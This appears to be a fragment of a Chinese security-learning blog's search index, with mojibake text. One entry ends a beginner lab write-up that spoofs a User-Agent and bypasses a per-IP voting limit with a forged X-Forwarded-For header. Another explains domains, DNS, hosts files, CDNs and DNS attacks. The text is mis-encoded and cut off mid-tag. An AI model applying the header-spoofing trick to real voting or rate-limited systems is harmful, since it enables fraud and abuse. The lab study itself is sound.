id="æµè§ˆå™¨ä¿¡æ¯ä¼ªé€ "><a href="#æµè§ˆå™¨ä¿¡æ¯ä¼ªé€ " class="headerlink" title="æµè§ˆå™¨ä¿¡æ¯ä¼ªé€ "></a>æµè§ˆå™¨ä¿¡æ¯ä¼ªé€ </h4><img src="https://p.pstatp.com/origin/pgc-image/81e5d54050674e2fbc50609c13bce880" style="zoom:80%;" /><p>éœ€è¦ä¼ªé€ IPhoneæ‰‹æœºå’Œ2Gä¿¡å·</p><p>é€šè¿‡ä¼ªé€ User-Agentæ¥å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/a7764c582fd24bf7a4e1269ffbe7ae2d"></p><p>æˆåŠŸä¼ªé€ </p><p><img src="https://p.pstatp.com/origin/pgc-image/6c5e25852b7c4cad98645f7f2b7b060a"></p><h4 id="HTTPåŠ¨ä½œç»ƒä¹ "><a href="#HTTPåŠ¨ä½œç»ƒä¹ " class="headerlink" title="HTTPåŠ¨ä½œç»ƒä¹ "></a>HTTPåŠ¨ä½œç»ƒä¹ </h4><p>è¿™é‡Œåº”è¯¥æ˜¯éœ€è¦å°†GETæ–¹å¼æ”¹ä¸ºPOSTæ–¹å¼ï¼ŒbpæŠ“åŒ…ç„¶åé€‰æ‹©å˜æ›´è¯·æ±‚æ–¹å¼ï¼Œç„¶åå‘åŒ…ã€‚</p><img src="https://p.pstatp.com/origin/pgc-image/0097ec344087463db15a174962ea1e8c" style="zoom:67%;" /><h4 id="æŠ•ç¥¨ç³»ç»Ÿç¼ºé™·"><a href="#æŠ•ç¥¨ç³»ç»Ÿç¼ºé™·" class="headerlink" title="æŠ•ç¥¨ç³»ç»Ÿç¼ºé™·"></a>æŠ•ç¥¨ç³»ç»Ÿç¼ºé™·</h4><p>è¦æ±‚è®©gggè·å¾—ç¬¬ä¸€ã€‚</p><p>æŠ“ä¸€ä¸‹åŒ…çœ‹ä¸€ä¸‹ã€‚åº”è¯¥æ˜¯é€šè¿‡ipå»é™åˆ¶æŠ•ç¥¨æ¬¡æ•°ï¼Œè¿™é‡Œä½¿ç”¨<code>X-Forwarded-For</code>æ¥ä¼ªé€ ipï¼Œç„¶åå°±å¯ä»¥æ— é™æŠ•ç¥¨äº†ã€‚</p><img src="https://p.pstatp.com/origin/pgc-image/adb3167cc5cc481581441f254a9aec78" style="zoom:67%;" /><p>æˆåŠŸå¾—åˆ°ç¬¬ä¸€</p><p><img src="https://p.pstatp.com/origin/pgc-image/6f1fe0e72a6a47a0a06fad49b3e9e485"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01åŸºç¡€å…¥é—¨--æ¦‚å¿µåè¯</title>
      <link href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜ŠğŸ˜Š</p><span id="more"></span><h3 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h3><h4 id="ä»€ä¹ˆæ˜¯åŸŸå"><a href="#ä»€ä¹ˆæ˜¯åŸŸå" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸŸå"></a>ä»€ä¹ˆæ˜¯åŸŸå</h4><p>åŸŸåï¼ˆDomain namesï¼‰æ˜¯äº’è”ç½‘åŸºç¡€æ¶æ„çš„å…³é”®éƒ¨åˆ†ã€‚å®ƒä»¬ä¸ºäº’è”ç½‘ä¸Šä»»ä½•å¯ç”¨çš„ç½‘é¡µæœåŠ¡å™¨æä¾›äº†æ–¹ä¾¿äººç±»ç†è§£çš„åœ°å€ã€‚</p><p>ä»»ä½•è¿ä¸Šäº’è”ç½‘çš„ç”µè„‘éƒ½å¯ä»¥é€šè¿‡ä¸€ä¸ªå…¬å…±IPåœ°å€è®¿é—®åˆ°ï¼Œå¯¹äºIPv4åœ°å€æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æœ‰32ä½ï¼ˆå®ƒä»¬é€šå¸¸å†™æˆå››ä¸ªèŒƒå›´åœ¨0~255ä»¥å†…ï¼Œç”±ç‚¹åˆ†éš”çš„æ•°å­—ç»„æˆï¼Œæ¯”å¦‚173.194.121.32ï¼‰ï¼Œè€Œå¯¹äºIPv6æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æœ‰128ä½ï¼Œé€šå¸¸å†™æˆå…«ç»„ç”±å†’å·åˆ†éš”çš„å››ä¸ªåå…­è¿›åˆ¶æ•°(e.g., <code>2027:0da8:8b73:0000:0000:8a2e:0370:1337</code>). è®¡ç®—æœºå¯ä»¥å¾ˆå®¹æ˜“åœ°å¤„ç†è¿™äº›IPåœ°å€, ä½†æ˜¯å¯¹ä¸€ä¸ªäººæ¥è¯´å¾ˆéš¾æ‰¾å‡ºè°åœ¨æ“æ§è¿™äº›æœåŠ¡å™¨ä»¥åŠè¿™äº›ç½‘ç«™æä¾›ä»€ä¹ˆæœåŠ¡ã€‚IP åœ°å€å¾ˆéš¾è®°å¿†è€Œä¸”å¯èƒ½ä¼šéšç€æ—¶é—´çš„æ¨ç§»å‘ç”Ÿæ”¹å˜ ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨æ–¹ä¾¿è®°å¿†çš„åœ°å€ï¼Œç§°ä½œåŸŸåã€‚</p><h4 id="åŸŸååœ¨å“ªé‡Œæ³¨å†Œ"><a href="#åŸŸååœ¨å“ªé‡Œæ³¨å†Œ" class="headerlink" title="åŸŸååœ¨å“ªé‡Œæ³¨å†Œ"></a>åŸŸååœ¨å“ªé‡Œæ³¨å†Œ</h4><p>åŸŸåæ³¨å†Œæ˜¯Internetä¸­ç”¨äºè§£å†³åœ°å€å¯¹åº”é—®é¢˜çš„ä¸€ç§æ–¹æ³•ã€‚æ ¹æ®ä¸­å›½äº’è”ç½‘ç»œåŸŸåç®¡ç†åŠæ³•ï¼ŒåŸŸåæ³¨å†ŒæœåŠ¡æœºæ„åŠåŸŸåæ³¨å†Œç®¡ç†æœºæ„éœ€å¯¹ç”³è¯·äººæå‡ºçš„åŸŸåæ˜¯å¦è¿åäº†ç¬¬ä¸‰æ–¹çš„æƒåˆ©å’Œç”³è¯·äººçš„çœŸå®èº«ä»½è¿›è¡Œæ ¸éªŒã€‚æ¯ä¸€ä¸ªç›¸åŒé¡¶çº§åŸŸåä¸­çš„äºŒçº§åŸŸåæ³¨å†Œéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸å¯é‡å¤çš„ï¼Œä½†ä¸åŒé¡¶çº§åŸŸåä¸­çš„äºŒçº§åŸŸåå¯ä»¥æ˜¯ç›¸åŒçš„ï¼Œä¾‹å¦‚baiduè¿™ä¸ªäºŒçº§åŸŸåæ›¾å¯ä»¥åœ¨.comä¸­æ³¨å†Œï¼Œä¹Ÿå¯ä»¥åœ¨.cnä¸­æ³¨å†Œï¼Œä¹Ÿå¯ä»¥åœ¨.xyzä¸­åŠå…¶ä»–å¤šç§é¡¶çº§åŸŸåä¸­æ³¨å†Œï¼Œä¸”æ¯ä¸ªåŸŸåéƒ½èµ·åˆ°åŒæ ·çš„ä½œç”¨ã€‚å› æ­¤ï¼Œåœ¨ç½‘ç»œä¸ŠåŸŸåæ˜¯ä¸€ç§ç›¸å¯¹æœ‰é™çš„èµ„æºï¼Œå®ƒçš„ä»·å€¼éšç€æ³¨å†Œä¼ä¸šå’Œä¸ªäººç”¨æˆ·çš„å¢å¤šè€Œé€æ­¥ä¸ºäººä»¬æ‰€é‡è§†ã€‚ä¸€èˆ¬åŸŸåéœ€è¦é€šè¿‡åŸŸåæ³¨å†Œå•†å»æ³¨å†Œã€‚</p><h4 id="é¡¶çº§åŸŸåã€ä¸€çº§åŸŸå"><a href="#é¡¶çº§åŸŸåã€ä¸€çº§åŸŸå" class="headerlink" title="é¡¶çº§åŸŸåã€ä¸€çº§åŸŸå"></a>é¡¶çº§åŸŸåã€ä¸€çº§åŸŸå</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Top-level domainsï¼Œfirst-level domainsï¼ˆTLDsï¼‰ï¼Œä¹Ÿç¿»è¯‘ä¸ºå›½é™…é¡¶çº§åŸŸåï¼Œä¹Ÿæˆä¸€çº§åŸŸåã€‚</span><br><span class="line">ã€€ã€€.com ä¾›å•†ä¸šæœºæ„ä½¿ç”¨ï¼Œä½†æ— é™åˆ¶æœ€å¸¸ç”¨</span><br><span class="line">ã€€ã€€.net åŸä¾›ç½‘ç»œæœåŠ¡ä¾›åº”å•†ä½¿ç”¨ï¼Œç°æ— é™åˆ¶</span><br><span class="line">ã€€ã€€.org åŸä¾›ä¸å±äºå…¶ä»–é€šç”¨é¡¶çº§åŸŸç±»åˆ«çš„ç»„ç»‡ä½¿ç”¨ï¼Œç°æ— é™åˆ¶</span><br><span class="line">ã€€ã€€.edu / .gov / .mil ä¾›ç¾å›½æ•™è‚²æœºæ„/ç¾å›½æ”¿åºœæœºå…³/ç¾å›½å†›äº‹æœºæ„ã€‚å› å†å²é—ç•™é—®é¢˜ä¸€èˆ¬åªåœ¨ç¾å›½ä¸“ç”¨</span><br><span class="line">ã€€ã€€.aero ä¾›èˆªç©ºè¿è¾“ä¸šä½¿ç”¨</span><br><span class="line">ã€€ã€€.biz ä¾›å•†ä¸šä½¿ç”¨</span><br><span class="line">ã€€ã€€.coop ä¾›è”åˆä¼šï¼ˆcooperativesï¼‰ä½¿ç”¨</span><br><span class="line">ã€€ã€€.info ä¾›ä¿¡æ¯æ€§ç½‘ç«™ä½¿ç”¨ï¼Œä½†æ— é™åˆ¶</span><br><span class="line">ã€€ã€€.museum ä¾›åšç‰©é¦†ä½¿ç”¨</span><br><span class="line">ã€€ã€€.name ä¾›å®¶åº­åŠä¸ªäººä½¿ç”¨</span><br><span class="line">ã€€ã€€.pro ä¾›éƒ¨åˆ†ä¸“ä¸šä½¿ç”¨</span><br><span class="line">ã€€ã€€.asia ä¾›äºšæ´²ç¤¾åŒºä½¿ç”¨</span><br><span class="line">ã€€ã€€.tel ä¾›è¿æ¥ç”µè¯ç½‘ç»œä¸å› ç‰¹ç½‘çš„æœåŠ¡ä½¿ç”¨</span><br><span class="line">ã€€ã€€.post ä¾›é‚®æ”¿æœåŠ¡ä½¿ç”¨</span><br><span class="line">ã€€ã€€.mail ä¾›é‚®ä»¶ç½‘ç«™ä½¿ç”¨</span><br><span class="line">ã€€ã€€å›½å®¶é¡¶çº§åŸŸåï¼šcnï¼ˆä¸­å›½å¤§é™†ï¼‰ã€deï¼ˆå¾·å›½ï¼‰ã€euï¼ˆæ¬§ç›Ÿï¼‰ã€jpï¼ˆæ—¥æœ¬ï¼‰ã€hkï¼ˆä¸­å›½é¦™æ¸¯ï¼‰ã€twï¼ˆä¸­å›½å°æ¹¾ï¼‰ã€ukï¼ˆè‹±å›½ï¼‰ã€usï¼ˆç¾å›½ï¼‰</span><br></pre></td></tr></table></figure><h4 id="ä»€ä¹ˆæ˜¯äºŒçº§åŸŸåå¤šçº§åŸŸåï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯äºŒçº§åŸŸåå¤šçº§åŸŸåï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯äºŒçº§åŸŸåå¤šçº§åŸŸåï¼Ÿ"></a>ä»€ä¹ˆæ˜¯äºŒçº§åŸŸåå¤šçº§åŸŸåï¼Ÿ</h4><p>äºŒçº§åŸŸï¼ˆæˆ–ç§°äºŒçº§åŸŸåï¼›è‹±è¯­ï¼šSecond-level domainï¼›è‹±æ–‡ç¼©å†™ï¼šSLDï¼‰æ˜¯äº’è”ç½‘DNSç­‰çº§ä¹‹ä¸­ï¼Œå¤„äºé¡¶çº§åŸŸåä¹‹ä¸‹çš„åŸŸã€‚äºŒçº§åŸŸåæ˜¯åŸŸåçš„å€’æ•°ç¬¬äºŒä¸ªéƒ¨åˆ†ï¼Œä¾‹å¦‚åœ¨åŸŸåexample.baidu.comä¸­ï¼ŒäºŒçº§åŸŸåæ˜¯Baiduã€‚</p><p>ã€€ã€€.com é¡¶çº§åŸŸå/ä¸€çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«é¡¶çº§åŸŸ</p><p>ã€€ã€€baidu.com äºŒçº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«äºŒçº§åŸŸ</p><p>ã€€ã€€tieba.baidu.com ä¸‰çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«ä¸‰çº§åŸŸ</p><p>ã€€ã€€detail.tieba.baidu.com å››çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«å››çº§åŸŸ</p><p>â€¦â€¦.</p><h4 id="åŸŸåå‘ç°å¯¹äºå®‰å…¨æµ‹è¯•æ„ä¹‰ï¼Ÿ"><a href="#åŸŸåå‘ç°å¯¹äºå®‰å…¨æµ‹è¯•æ„ä¹‰ï¼Ÿ" class="headerlink" title="åŸŸåå‘ç°å¯¹äºå®‰å…¨æµ‹è¯•æ„ä¹‰ï¼Ÿ"></a>åŸŸåå‘ç°å¯¹äºå®‰å…¨æµ‹è¯•æ„ä¹‰ï¼Ÿ</h4><p>  â€ƒâ€ƒè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œå…¶ä¸»åŸŸåæ‰¾ä¸åˆ°æ¼æ´æ—¶ï¼Œå°±å¯ä»¥å°è¯•å»æµ‹è¯•æ”¶é›†åˆ°çš„å­åŸŸåï¼Œæœ‰å¯èƒ½æµ‹è¯•å­åŸŸåç½‘ç«™æ—¶ä¼šæœ‰æ„å‘ä¸åˆ°çš„æ•ˆæœï¼Œç„¶åå¯ä»¥ç”±æ­¤æ¨ªå‘åˆ°ä¸»ç½‘ç«™ã€‚</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="ä»€ä¹ˆæ˜¯DNSï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯DNSï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯DNSï¼Ÿ"></a>ä»€ä¹ˆæ˜¯DNSï¼Ÿ</h4><p>DNSï¼ˆDomain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨ï¼‰æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)è½¬æ¢çš„æœåŠ¡å™¨ã€‚DNSä¸­ä¿å­˜äº†ä¸€å¼ åŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)çš„è¡¨ï¼Œä»¥è§£ææ¶ˆæ¯çš„åŸŸåã€‚ ä¾‹å¦‚ç™¾åº¦çš„åŸŸåæ˜¯<a href="http://www.baidu.com,åœ¨dnsä¸­å¯¹åº”çš„ipæ˜¯1.2.3.4(å‡è®¾),é‚£ä¹ˆæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç™¾åº¦çš„åŸŸå,dnså°±ä¼šè§£æä¸º1.2.3.4./">www.baidu.com,åœ¨DNSä¸­å¯¹åº”çš„IPæ˜¯1.2.3.4(å‡è®¾),é‚£ä¹ˆæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç™¾åº¦çš„åŸŸåï¼ŒDNSå°±ä¼šè§£æä¸º1.2.3.4ã€‚</a></p><h4 id="æœ¬åœ°HOSTSä¸DNSçš„å…³ç³»ï¼Ÿ"><a href="#æœ¬åœ°HOSTSä¸DNSçš„å…³ç³»ï¼Ÿ" class="headerlink" title="æœ¬åœ°HOSTSä¸DNSçš„å…³ç³»ï¼Ÿ"></a>æœ¬åœ°HOSTSä¸DNSçš„å…³ç³»ï¼Ÿ</h4><p>å®¢æˆ·ç«¯æŸ¥è¯¢DNSçš„è¿‡ç¨‹æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°hostæ–‡ä»¶â€”æœ¬åœ°ç¼“å­˜â€”-DNSæœåŠ¡å™¨</span><br></pre></td></tr></table></figure><p>Hostsæ–‡ä»¶ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Windowsä¸­ï¼Œå®ƒçš„ç›®å½•é€šå¸¸åœ¨Cç›˜çš„Windows\system32\drivers\etc\ä¸‹ã€‚</span><br></pre></td></tr></table></figure><p>Hostsæ–‡ä»¶æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬å°±å¯ä»¥å°†å…¶æ‰“å¼€ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯æ ¹æ®TCP/IP for Windows çš„æ ‡å‡†æ¥å·¥ä½œçš„ï¼Œå®ƒçš„ä½œç”¨æ˜¯åŒ…å«IPåœ°å€å’ŒHost name(ä¸»æœºå)çš„æ˜ å°„å…³ç³»ï¼Œæ¯æ®µåªèƒ½åŒ…æ‹¬ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼ŒIPåœ°å€è¦æ”¾åœ¨æ¯æ®µçš„æœ€å‰é¢ï¼Œåé¢å†™Host name(ä¸»æœºå)ï¼Œä¸­é—´åŠ ä¸ªç©ºæ ¼ã€‚å¦‚ï¼š<code>127.0.0.1 localhost</code>.</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“ç”µè„‘è®¿é—®ç½‘ç«™æ—¶ï¼Œé¦–å…ˆé€šè¿‡DNSæœåŠ¡å™¨æŠŠç½‘ç»œ <a href="https://cloud.tencent.com/product/cns?from=10680">åŸŸåè§£æ</a>æˆIPåœ°å€åï¼Œæˆ‘ä»¬çš„è®¡ç®—æœºæ‰èƒ½è®¿é—®ã€‚å¦‚æœæ¯ä¸ªåŸŸåè¯·æ±‚éƒ½è¦ç­‰å¾…åŸŸåæœåŠ¡å™¨è§£æåè¿”å›IPï¼Œè®¿é—®é€Ÿåº¦å°±ä¼šæ¯”è¾ƒæ…¢ï¼Œè€ŒHostsæ–‡ä»¶æ­£å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åœ¨è¿›è¡ŒDNSè¯·æ±‚ä»¥å‰ï¼ŒWindowsç³»ç»Ÿä¼šå…ˆæ£€æŸ¥Hostsæ–‡ä»¶ä¸­æ˜¯å¦æœ‰è¿™ä¸ªåœ°å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå¦‚æœæ²¡æœ‰å†å‘DNSæœåŠ¡å™¨æå‡ºåŸŸåè§£æã€‚</p><p>egï¼šè¿™é‡Œç”¨æˆ‘è‡ªå·±çš„åšå®¢åœ°å€ä½œä¸ºæ¼”ç¤ºï¼Œå½“æˆ‘ä»¬ping l0ne1y.github.ioçš„æ—¶å€™å¯ä»¥çœ‹åˆ°ä»–çš„ipåœ°å€æ˜¯185.199.110.153ã€‚</p><p><img src="https://p.pstatp.com/origin/pgc-image/dbba0580625e4cf8956b037c5e6c36c2"></p><p>å½“æˆ‘ä»¬ä¿®æ”¹äº†æœ¬åœ°hostsæ–‡ä»¶åï¼Œå†æ¬¡ping l0ne1y.github.ioåœ°å€ï¼Œå‘ç°ipåœ°å€å˜æˆäº†1.2.3.4ã€‚</p><p><img src="https://p.pstatp.com/origin/pgc-image/311b8910aa7a4db69ebdfcb9a119b136"></p><p><img src="https://p.pstatp.com/origin/pgc-image/80083fe044f84de5a6f6f0b6c3bc5f27"></p><h4 id="CDNæ˜¯ä»€ä¹ˆï¼Ÿä¸DNSçš„å…³ç³»ï¼Ÿ"><a href="#CDNæ˜¯ä»€ä¹ˆï¼Ÿä¸DNSçš„å…³ç³»ï¼Ÿ" class="headerlink" title="CDNæ˜¯ä»€ä¹ˆï¼Ÿä¸DNSçš„å…³ç³»ï¼Ÿ"></a>CDNæ˜¯ä»€ä¹ˆï¼Ÿä¸DNSçš„å…³ç³»ï¼Ÿ</h4><p>CDNçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDNæ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œç°åœ¨æœåŠ¡å™¨åœ¨åŒ—äº¬ï¼Œæ·±åœ³çš„ç”¨æˆ·æƒ³è¦è·å–æœåŠ¡å™¨ä¸Šçš„æ•°æ®å°±éœ€è¦è·¨è¶Šä¸€ä¸ªå¾ˆè¿œçš„è·ç¦»ï¼Œè¿™æ˜¾ç„¶å°±æ¯”åŒ—äº¬çš„ç”¨æˆ·è®¿é—®åŒ—äº¬çš„æœåŠ¡å™¨é€Ÿåº¦è¦æ…¢ã€‚ä½†æ˜¯ç°åœ¨æˆ‘ä»¬åœ¨æ·±åœ³å»ºç«‹ä¸€ä¸ªCDNæœåŠ¡å™¨ï¼Œä¸Šé¢ç¼“å­˜ä½ä¸€äº›æ•°æ®ï¼Œæ·±åœ³ç”¨æˆ·è®¿é—®æ—¶å…ˆè®¿é—®è¿™ä¸ªCDNæœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨ä¸Šæœ‰ç”¨æˆ·è¯·æ±‚çš„æ•°æ®å°±å¯ä»¥ç›´æ¥è¿”å›ï¼Œè¿™æ ·é€Ÿåº¦å°±å¤§å¤§çš„æå‡äº†ã€‚</p><p>CDNå®é™…ä¸Šæ˜¯ä¸€ä¸ªå°±è¿‘è®¿é—®ï¼Œé‚£ä¹ˆç°åœ¨æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“ç”¨æˆ·çš„æ‰€åœ¨ä½ç½®ä»è€Œç»™ä»–åˆ†é…æœ€ä½³çš„CDNèŠ‚ç‚¹å‘¢ã€‚è¿™å°±éœ€è¦DNSæœåŠ¡æ¥è¿›è¡Œå®šä½äº†ã€‚å½“æˆ‘ä»¬é€šè¿‡ä½¿ç”¨DNSæœåŠ¡çš„æ—¶å€™ï¼Œå¯ä»¥æ ¹æ®ä»–ä½¿ç”¨çš„LDNSæœåŠ¡å™¨æ¥è¿›è¡Œä¸€ä¸ªå®šä½ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡å™¨çœ‹åˆ°ä»–æ˜¯æ¥è‡ªæ·±åœ³ç”µä¿¡çš„LDNSæœåŠ¡å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è®¤ä¸ºè¯¥ç”¨æˆ·æ¥è‡ªæ·±åœ³ç”µä¿¡ï¼Œç„¶åè°ƒåº¦æœåŠ¡å™¨å¯ä»¥è®©è¯¥ç”¨æˆ·å»è®¿é—®æ·±åœ³ç”µä¿¡çš„CDNæœåŠ¡å™¨ï¼Œè¿™æ ·å°±è®©ç”¨æˆ·è®¿é—®åˆ°äº†æœ€ä¼˜çš„CDNèŠ‚ç‚¹ã€‚é€šè¿‡DNSæœåŠ¡æˆ‘ä»¬å¯ä»¥å¾ˆå¿«çš„å®šä½åˆ°ç”¨æˆ·çš„ä½ç½®ï¼Œç„¶åç»™ç”¨æˆ·åˆ†é…æœ€ä½³CDNèŠ‚ç‚¹.</p><h4 id="å¸¸è§çš„DNSå®‰å…¨æ”»å‡»æœ‰å“ªäº›"><a href="#å¸¸è§çš„DNSå®‰å…¨æ”»å‡»æœ‰å“ªäº›" class="headerlink" title="å¸¸è§çš„DNSå®‰å…¨æ”»å‡»æœ‰å“ªäº›?"></a>å¸¸è§çš„DNSå®‰å…¨æ”»å‡»æœ‰å“ªäº›?</h4><ol><li>åŸŸååŠ«æŒ</li></ol><p>é€šè¿‡é‡‡ç”¨é»‘å®¢æ‰‹æ®µæ§åˆ¶äº†åŸŸåç®¡ç†å¯†ç å’ŒåŸŸåç®¡ç†é‚®ç®±ï¼Œç„¶åå°†è¯¥åŸŸåçš„NSçºªå½•æŒ‡å‘åˆ°é»‘å®¢å¯ä»¥æ§åˆ¶çš„DNSæœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡åœ¨è¯¥DNSæœåŠ¡å™¨ä¸Šæ·»åŠ ç›¸åº”åŸŸåçºªå½•ï¼Œä»è€Œä½¿ç½‘æ°‘è®¿é—®è¯¥åŸŸåæ—¶ï¼Œè¿›å…¥äº†é»‘å®¢æ‰€æŒ‡å‘çš„å†…å®¹ã€‚è¿™æ˜¾ç„¶æ˜¯DNSæœåŠ¡æä¾›å•†çš„è´£ä»»ï¼Œç”¨æˆ·æŸæ‰‹æ— ç­–ã€‚</p><ol start="2"><li>ç¼“å­˜æŠ•æ¯’</li></ol><p>åˆ©ç”¨æ§åˆ¶DNSç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠåŸæœ¬å‡†å¤‡è®¿é—®æŸç½‘ç«™çš„ç”¨æˆ·åœ¨ä¸çŸ¥ä¸è§‰ä¸­å¸¦åˆ°é»‘å®¢æŒ‡å‘çš„å…¶ä»–ç½‘ç«™ä¸Šã€‚å…¶å®ç°æ–¹å¼æœ‰å¤šç§ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡åˆ©ç”¨ç½‘æ°‘ISPç«¯çš„DNSç¼“å­˜æœåŠ¡å™¨çš„æ¼æ´è¿›è¡Œæ”»å‡»æˆ–æ§åˆ¶ï¼Œä»è€Œæ”¹å˜è¯¥ISPå†…çš„ç”¨æˆ·è®¿é—®åŸŸåçš„å“åº”ç»“æœ;æˆ–è€…ï¼Œé»‘å®¢é€šè¿‡åˆ©ç”¨ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨ä¸Šçš„æ¼æ´ï¼Œå¦‚å½“ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨åŒæ—¶å¯ä»¥è¢«å½“ä½œç¼“å­˜æœåŠ¡å™¨ä½¿ç”¨ï¼Œé»‘å®¢å¯ä»¥å®ç°ç¼“å­˜æŠ•æ¯’ï¼Œå°†é”™è¯¯çš„åŸŸåçºªå½•å­˜å…¥ç¼“å­˜ä¸­ï¼Œä»è€Œä½¿æ‰€æœ‰ä½¿ç”¨è¯¥ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·å¾—åˆ°é”™è¯¯çš„DNSè§£æç»“æœã€‚</p><p>3)DDOSæ”»å‡»</p><p>ä¸€ç§æ”»å‡»é’ˆå¯¹DNSæœåŠ¡å™¨è½¯ä»¶æœ¬èº«ï¼Œé€šå¸¸åˆ©ç”¨BINDè½¯ä»¶ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¯¼è‡´DNSæœåŠ¡å™¨å´©æºƒæˆ–æ‹’ç»æœåŠ¡;å¦ä¸€ç§æ”»å‡»çš„ç›®æ ‡ä¸æ˜¯DNSæœåŠ¡å™¨ï¼Œè€Œæ˜¯åˆ©ç”¨DNSæœåŠ¡å™¨ä½œä¸ºä¸­é—´çš„â€œæ”»å‡»æ”¾å¤§å™¨â€ï¼Œå»æ”»å‡»å…¶å®ƒäº’è”ç½‘ä¸Šçš„ä¸»æœºï¼Œå¯¼è‡´è¢«æ”»å‡»ä¸»æœºæ‹’ç»æœåŠ¡ã€‚</p><ol 